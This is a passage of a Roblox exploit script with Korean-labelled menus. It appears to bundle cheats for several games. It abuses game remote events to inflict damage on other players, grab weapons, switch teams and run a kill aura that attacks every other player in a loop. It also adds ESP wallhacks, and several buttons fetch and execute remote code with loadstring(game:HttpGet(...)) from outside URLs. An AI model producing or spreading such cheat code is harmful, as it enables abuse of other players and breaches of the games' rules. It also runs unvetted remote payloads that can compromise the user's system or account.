        ["FriendlyFire"] = false,
        ["MeleeHeadshotEnabled"] = true,
        ["AngleZ_Min"] = -1,
        ["MeleeBloodWoundPartColor"] = true,
        ["AngleY_Min"] = 0,
        ["Level2ChargingTime"] = 2,
        ["ExplosionKnockbackMultiplierOnTarget"] = 2,
        ["DamageDropOffEnabled"] = false,
        ["ReduceSelfDamageOnAirOnly"] = false,
        ["ExplosionKnockbackPower"] = 50,
        ["MarkerEffectSize"] = 0.5,
        ["FullyGibbedLimbChance"] = 50,
        ["MeleeHitCharSndIDs"] = {
            [1] = 6398015798,
            [2] = 6398016125,
            [3] = 6398016391,
            [4] = 6398016618
        },
        ["HitmarkerColorHS"] = Color3.new(1, 0, 0),
        ["IdleAnimationID"] = 10587352972,
        ["ExplosionSoundVolume"] = 1,
        ["LimitedAmmoEnabled"] = false,
        ["SecondaryShotgunPumpinSpeed"] = 0.5,
        ["RecoilDamper"] = 0.65,
        ["FireAnimationSpeed"] = 1,
        ["ExplosionSoundEnabled"] = true,
        ["FireRate"] = 0.5,
        ["EquippedAnimationSpeed"] = 1,
        ["MeleeBloodWoundVisibleTime"] = 3,
        ["HitmarkerFadeTimeHS"] = 0.4,
        ["ExplosionCraterTexture"] = {
            [1] = 53875997
        },
        ["FieldOfViewS"] = 12.5,
        ["BloodWoundSize"] = 0.5,
        ["FireRates"] = {
            [1] = 0.125,
            [2] = 0.5,
            [3] = 0.5,
            [4] = 0.1
        },
        ["FireModes"] = {
            [1] = 1,
            [2] = 2,
            [3] = 3,
            [4] = true
        },
        ["ChargeAlterTable"] = {},
        ["MarkerEffectVisibleTime"] = 3,
        ["PreShotgunReloadAnimationSpeed"] = 1,
        ["AimChargingAnimationSpeed"] = 1,
        ["MeleeDebuff"] = false,
        ["BloodWoundEnabled"] = true,
        ["HeadshotDamageMultiplier"] = 1.5,
        ["MeleeHitCharSndPitchMin"] = 1,
        ["HeatPerFireMin"] = 7,
        ["HitmarkerSoundPitchHS"] = 1,
        ["Auto"] = false,
        ["BloodWoundTextureColor"] = Color3.new(1, 0, 0),
        ["BulletShellDelay"] = 0,
        ["LightRange"] = 15,
        ["ProjectileType"] = "NewBullet",
        ["MinDepletion"] = 2,
        ["BulletShellEnabled"] = true,
        ["BulletHoleEnabled"] = true,
        ["SelfDamageRedution"] = 0.5,
        ["CrossSize"] = 7,
        ["CrossSpeed"] = 15
    },
    [4] = v.Character.Humanoid,
    [5] = v.Character.HumanoidRootPart,
    [6] = v.Character.Torso,
    [7] = {
        ["ChargeLevel"] = 0,
        ["ExplosionEffectFolder"] = game:GetService("ReplicatedStorage"):WaitForChild("Miscs"):WaitForChild("GunVisualEffects"):WaitForChild("Common"):WaitForChild("ExplosionEffect"),
        ["MuzzleFolder"] = game:GetService("ReplicatedStorage"):WaitForChild("Miscs"):WaitForChild("GunVisualEffects"):WaitForChild("Common"):WaitForChild("MuzzleEffect"),
        ["HitEffectFolder"] = game:GetService("ReplicatedStorage"):WaitForChild("Miscs"):WaitForChild("GunVisualEffects"):WaitForChild("Common"):WaitForChild("HitEffect"),
        ["GoreEffect"] = game:GetService("ReplicatedStorage"):WaitForChild("Miscs"):WaitForChild("GunVisualEffects"):WaitForChild("Common"):WaitForChild("GoreEffect"),
        ["BloodEffectFolder"] = game:GetService("ReplicatedStorage"):WaitForChild("Miscs"):WaitForChild("GunVisualEffects"):WaitForChild("Common"):WaitForChild("BloodEffect")
    },
    [8] = 4.550436019897461
}

game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("InflictTarget"):InvokeServer(unpack(args))

end
end
   end,
})

local Tab = Window:CreateTab("프리즌 라이프  ", nil) -- Title, Image

local Button = Tab:CreateButton({
   Name = "aK47 가져가기 ",
   Callback = function()
local args = {
    [1] = workspace:WaitForChild("Prison_ITEMS"):WaitForChild("giver"):WaitForChild("AK-47"):WaitForChild("ITEMPICKUP")
}

workspace:WaitForChild("Remote"):WaitForChild("ItemHandler"):InvokeServer(unpack(args)) 

local Button = Tab:CreateButton({
   Name = "간수되기",
   Callback = function()
-- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = "Bright blue"
}

workspace.Remote.TeamEvent:FireServer(unpack(args))
   end,
})
   end,
})

local Button = Tab:CreateButton({
   Name = "오토에임 (킬아우라) ",
   Callback = function()
mainRemotes = game.ReplicatedStorage
meleeRemote = mainRemotes['meleeEvent']

killAura = true

contextactionservice = game.ContextActionService

function toggleKillAura(actionName, inputState, inputObject)
print('Doing the action : ' .. actionName)
if inputState == Enum.UserInputState.Begin then
if killAura == true then
killAura = false
else
killAura = true
end
end
end

contextactionservice:BindAction('ToggleKillAura', toggleKillAura, false, Enum.KeyCode.K)

while wait() do
if killAura == true then
for _, plr in pairs (game:GetService('Players'):GetChildren()) do
if plr.Name ~= game.Players.LocalPlayer.Name then
meleeRemote:FireServer(plr)
end
end
end
end
   end,
})

local Button = Tab:CreateButton({
   Name = "프리즌 라이프 팀 구별 ESP ",
   Callback = function()
local Players = game:GetService("Players")
local Teams = game:GetService("Teams")
local RunService = game:GetService("RunService")

-- 팀 이름을 설정합니다.
local teamColors = {
    ["Criminals"] = Color3.fromRGB(255, 0, 0),
    ["Guards"] = Color3.fromRGB(0, 0, 255),
    ["lnmates"] = Color3.fromRGB(0, 255, 0)
}

local function applyTeamColor(player)
    local character = player.Character
    if not character then return end

    local highlight = Instance.new("Highlight")
    highlight.Parent = character
    highlight.Adornee = character

    local function updateColor()
        local team = player.Team
        if team and teamColors[team.Name] then
            highlight.FillColor = teamColors[team.Name]
        else
            highlight.FillColor = Color3.fromRGB(255, 255, 255) -- 기본 색상 (흰색)
        end
    end

    player:GetPropertyChangedSignal("Team"):Connect(updateColor)
    updateColor() -- 초기 색상 설정
end

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        applyTeamColor(player)
    end)
end)

-- 이미 게임에 있는 플레이어에 대해 팀 색상 적용
for _, player in ipairs(Players:GetPlayers()) do
    player.CharacterAdded:Connect(function()
        applyTeamColor(player)
    end)
    if player.Character then
        applyTeamColor(player)
    end
end 

   end,
})

local Tab = Window:CreateTab("블피 스크립트", 4483362458) -- Title, Image
local Section = Tab:CreateSection("블피")

local Button = Tab:CreateButton({
   Name = "블피 스크립트 (솔라라 노작동)",
   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
   end,
})

local Slider = Tab:CreateSlider({
   Name = "대쉬 거리  ",
   Range = {10, 500},
   Increment = 1,
   Suffix = "대쉬 거리 ",
   CurrentValue = 10,
   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
    game.Players.LocalPlayer.Character:SetAttribute("DashLength", Value)
   end,
})

local Tab = Window:CreateTab("분류되지 않는 스크립트", 4483362458) -- Title, Image
local Section = Tab:CreateSection("스크립트들")

local Button = Tab:CreateButton({
   Name = "ESP",
   Callback = function()
    local Players = game:GetService("Players"):GetChildren()
local RunService = game:GetService("RunService")
local highlight = Instance.new("Highlight")
highlight.Name = "Highlight"

for i, v in pairs(Players) do
    repeat wait() until v.Character
    if not v.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
        local highlightClone = highlight:Clone()
        highlightClone.Adornee = v.Character
        highlightClone.Parent = v.Character:FindFirstChild("HumanoidRootPart")
        highlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlightClone.Name = "Highlight"
    end
end

game.Players.PlayerAdded:Connect(function(player)
    repeat wait() until player.Character
    if not player.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
        local highlightClone = highlight:Clone()
        highlightClone.Adornee = player.Character
        highlightClone.Parent = player.Character:FindFirstChild("HumanoidRootPart")
        highlightClone.Name = "Highlight"
    end
end)

game.Players.PlayerRemoving:Connect(function(playerRemoved)
    playerRemoved.Character:FindFirstChild("HumanoidRootPart").Highlight:Destroy()
end)

RunService.Heartbeat:Connect(function()
    for i, v in pairs(Players) do
        repeat wait() until v.Character
        if not v.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
            local highlightClone = highlight:Clone()
            highlightClone.Adornee = v.Character
            highlightClone.Parent = v.Character:FindFirstChild("HumanoidRootPart")
            highlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            highlightClone.Name = "Highlight"
            task.wait()
        end
end
end)
   end,
})

local Button = Tab:CreateButton({
   Name = "중력 바꾸기 (e)",
   Callback = function()
    loadstring(game:HttpGet('https://cdn.wearedevs.net/scripts/Gravity%20Switch.txt'))()
   end,
})

